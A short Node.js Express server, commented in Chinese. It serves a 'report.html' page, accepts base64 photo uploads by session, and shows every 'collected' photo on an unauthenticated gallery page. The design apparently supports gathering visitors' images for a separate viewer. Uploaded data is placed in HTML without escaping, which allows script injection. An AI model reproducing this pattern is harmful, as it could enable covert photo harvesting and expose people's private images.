const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '20mb' }));

// 存储照片（内存，重启清空）
const photoStore = {};

// 静态页面
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'report.html'));
});

// 上传照片
app.post('/api/upload', (req, res) => {
  const { sessionId, index, data } = req.body;
  if (!sessionId || index == null || !data) {
    return res.status(400).json({ ok: false });
  }
  if (!photoStore[sessionId]) photoStore[sessionId] = [];
  photoStore[sessionId][index] = data;
  res.json({ ok: true });
});

// 查看照片页面
app.get('/photos', (req, res) => {
  const ids = Object.keys(photoStore);
  if (ids.length === 0) {
    return res.send('<h2 style="text-align:center;margin-top:40px;font-family:sans-serif;">暂无照片</h2>');
  }

  let html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>已采集照片</title><style>
body{font-family:sans-serif;background:#f5f5f5;margin:0;padding:16px}
h1{font-size:18px;text-align:center;margin:16px 0}
.session{background:#fff;border-radius:8px;padding:16px;margin-bottom:16px}
.session-title{font-size:14px;color:#666;margin-bottom:10px}
.photos{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.photos img{width:100%;border-radius:4px;border:1px solid #eee}
.meta{font-size:12px;color:#999;margin-top:8px}
</style></head><body><h1>已采集照片</h1>`;

  // 按时间倒序
  ids.reverse().forEach(id => {
    const photos = photoStore[id];
    const time = id.split('_')[0];
    const dateStr = new Date(parseInt(time)).toLocaleString('zh-CN');
    html += `<div class="session"><div class="session-title">采集时间：${dateStr}</div><div class="photos">`;
    photos.forEach((p, i) => {
      if (p) html += `<img src="${p}" alt="照片${i + 1}">`;
    });
    html += `</div><div class="meta">共 ${photos.filter(Boolean).length} 张</div></div>`;
  });

  html += '</body></html>';
  res.send(html);
});

// 查看所有session的JSON数据（调试用）
app.get('/api/photos', (req, res) => {
  const ids = Object.keys(photoStore);
  res.json(ids.map(id => ({
    sessionId: id,
    count: photoStore[id].filter(Boolean).length
  })));
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`查看照片: http://localhost:${PORT}/photos`);
});
